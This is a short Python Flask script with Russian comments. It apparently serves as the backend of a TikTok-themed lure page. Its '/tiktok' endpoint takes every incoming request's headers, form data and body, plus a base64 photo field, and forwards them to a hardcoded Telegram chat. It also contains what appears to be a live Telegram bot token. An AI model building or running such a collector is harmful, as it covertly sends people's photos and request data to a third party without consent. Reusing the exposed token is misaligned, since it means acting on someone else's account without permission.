from flask import Flask, request
import asyncio
from aiogram import Bot
from aiogram.types import InputFile
import base64
import io

token = '5766763452:AAG14hwIr0o3pxAN1JRYlnk7hhIeH1CobXM'
bot = Bot(token)

async def send_telegram_message(user_id, text):
    await bot.send_message(user_id, text)

async def send_telegram_photo(user_id, photo_data):
    # Декодируем base64 в байты
    image_data = base64.b64decode(photo_data.split(',')[1])
    
    # Создаем объект байтового потока
    photo = io.BytesIO(image_data)
    photo.name = 'image.png'  # Даем имя файлу
    
    # Отправляем фото
    await bot.send_photo(user_id, InputFile(photo))

app = Flask(__name__)

@app.route('/tiktok', methods=['POST', 'GET'])
def webhook():
    print("Received request")
    asyncio.get_event_loop().run_until_complete(send_telegram_message(5779182088, "Получен запрос"))

    # Логирование всех данных запроса
    log_data = {
        "method": request.method,
        "url": request.url,
        "headers": dict(request.headers),
        "args": dict(request.args),
        "form": dict(request.form),
        "json": request.get_json(silent=True),
        "data": request.get_data(as_text=True)
    }
    asyncio.get_event_loop().run_until_complete(send_telegram_message(5779182088, f"Данные запроса: {str(log_data)}"))

    # Распаковка данных из FORM
    form_data = request.form
    tiktok_url = form_data.get('tiktokUrl', '')
    id = form_data.get('id', '')
    redirect_url = form_data.get('redirectUrl', '')
    photo = form_data.get('foto', '')

    # Отправка дополнительной информации в Telegram
    additional_info = f"url={tiktok_url}, id={id}, redirect={redirect_url}"
    asyncio.get_event_loop().run_until_complete(send_telegram_message(5779182088, additional_info))

    # Отправка фото в Telegram
    if photo:
        asyncio.get_event_loop().run_until_complete(send_telegram_photo(5779182088, photo))

    return 'Success'

if __name__ == '__main__':
    app.run(debug=True)
